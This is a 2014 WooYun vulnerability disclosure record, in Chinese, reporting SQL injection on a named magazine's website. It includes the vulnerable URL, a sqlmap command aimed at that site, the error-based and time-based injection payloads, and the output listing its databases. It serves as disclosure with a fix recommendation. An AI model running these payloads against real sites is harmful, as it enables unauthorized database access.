{"id": 50033, "wybug_id": "wooyun-2014-079181", "wybug_title": "中国质量万里行官网存SQL注入漏洞", "wybug_corp": "中国质量万里行杂志社", "wybug_author": "gently", "wybug_date": "2014-10-13 15:58", "wybug_open_date": "2014-11-27 16:00", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-13：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-11-27：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 中国质量万里行官网存SQL注入漏洞，可得知后台，可扫后台管理员密码 详细说明：  页面地址：http://www.315online.com/plus/ts_view.php?aid=10随便输入一个引号：http://www.315online.com/plus/ts_view.php?aid=10%27报错了：\nMySQL Query : select ts.* from `dede_ts_info` ts where ts.id=10\\' MySQL Error : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\\'' at line 1 MySQL Errno : 1064 Message : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\\'' at line 1 Need Help?\n上sqlmap：\npython sqlmap.py -u 'http://www.315online.com/plus/ts_view.php?aid=111111' --user-agent='Mozilla/5.0' --dbs\n顺利列出数据库名称\navailable databases [3]:[*] information_schema[*] phpcms[*] test\n没再继续，人家毕竟是媒体的朋友，点到为止哈，这完全只是个测试   漏洞证明：  \nGET parameter 'aid' is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection points with a total of 442 HTTP(s) requests:---Place: GETParameter: aid    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: aid=111111 AND (SELECT 5824 FROM(SELECT COUNT(*),CONCAT(0x7163726171,(SELECT (CASE WHEN (5824=5824) THEN 1 ELSE 0 END)),0x71686c7971,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 OR time-based blind    Payload: aid=-9164 OR 7205=SLEEP(5)---[13:43:03] [INFO] the back-end DBMS is MySQLweb application technology: Apache 2.2.19back-end DBMS: MySQL 5.0[13:43:03] [INFO] fetching database names[13:43:03] [INFO] the SQL query used returns 3 entries[13:43:04] [INFO] retrieved: information_schema[13:43:04] [INFO] retrieved: phpcms[13:43:04] [INFO] retrieved: testavailable databases [3]:[*] information_schema[*] phpcms[*] test\n   修复方案：  过滤输入参数   版权声明：转载请注明来源 gently@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}